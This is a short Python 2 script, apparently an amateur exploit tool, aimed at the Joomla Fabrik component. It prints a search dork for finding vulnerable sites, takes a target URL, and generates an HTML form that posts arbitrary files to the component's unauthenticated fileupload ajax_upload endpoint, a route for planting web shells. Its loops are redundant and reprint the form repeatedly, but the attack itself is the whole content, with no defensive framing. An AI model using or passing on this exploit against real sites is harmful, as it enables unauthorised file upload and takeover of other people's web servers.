import urllib2
import os

os.system('cls||clear')

print('''
	 #####Script : RamuExpJun By Ramu##
	 ########Coded By Ramu #############
	 #Compt Fb : https://www.facebook.com/che.ry.10690203
	 ''')

print("[*] Dork is (inurl:index.php?option=com_fabrik)")

ServerLink = raw_input("Enter Link For Exploit[!]>>")
options = '/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload'

for i in options:
	
	Exploit = ('''<form method="POST" action="Link"
          enctype="multipart/form-data">
    <input type="file" name="file" /><button>Upload</button>
     </form>''')

	FindEx = ServerLink + options

	for x in Exploit:
		BlackFamily = Exploit.replace('Link',FindEx)
		print(BlackFamily)

